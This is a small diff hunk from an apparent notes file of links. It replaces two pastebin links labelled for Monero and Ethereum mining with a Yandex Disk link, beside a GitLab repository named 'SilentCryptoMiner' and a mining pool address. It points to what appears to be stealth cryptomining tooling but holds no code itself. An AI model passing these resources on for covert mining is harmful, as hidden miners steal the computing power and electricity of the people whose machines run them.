@@ -23,8 +23,7 @@ https://www.youtube.com/watch?v=YrxR6WaagK4
 
 
 
-https://pastebin.com/h4sbQGwj - monero
-https://pastebin.com/wH71PSfR - ethc
+https://disk.yandex.ru/d/33GdUzLccWX6UA
 
 https://gitlab.com/UnamSactam/SilentCryptoMiner
 pool.hashvault.pro:443
